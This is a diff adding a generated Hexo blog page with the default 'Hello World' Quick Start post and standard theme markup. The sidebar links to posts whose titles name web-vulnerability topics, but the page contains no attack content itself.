+        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/14/hello-world/" data-id="ck2ixd3yb000eukv00jf2l8es" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/11/03/变量覆盖/">变量覆盖</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/03/平行越权、垂直越权/">平行越权、垂直越权</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/03/支付漏洞/">支付漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/03/验证码绕过、密码找回漏洞/">验证码绕过、密码找回漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/03/unserialize反序列化漏洞/">unserialize反序列化漏洞</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
